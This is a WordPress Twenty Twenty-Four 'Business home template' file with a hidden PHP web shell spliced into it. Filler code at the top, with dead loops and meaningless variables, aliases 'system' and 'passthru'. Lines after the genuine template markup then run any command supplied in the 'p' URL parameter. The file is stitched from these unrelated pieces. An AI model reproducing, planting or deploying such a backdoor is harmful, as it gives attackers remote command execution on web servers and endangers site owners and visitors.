<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Business home template
 * Slug: twentytwentyfour/template-home-business
 * Template Types: front-page, home
 * Viewport width: 1400
 * Inserter: no
 */
?>

<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->

<!-- wp:group {"tagName":"main","style":{"spacing":{"blockGap":"0","margin":{"top":"0"}}},"layout":{"type":"default"}} -->
<main class="wp-block-group" style="margin-top:0">
	<!-- wp:pattern {"slug":"twentytwentyfour/page-home-business"} /-->
</main>
<!-- /wp:group -->

<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>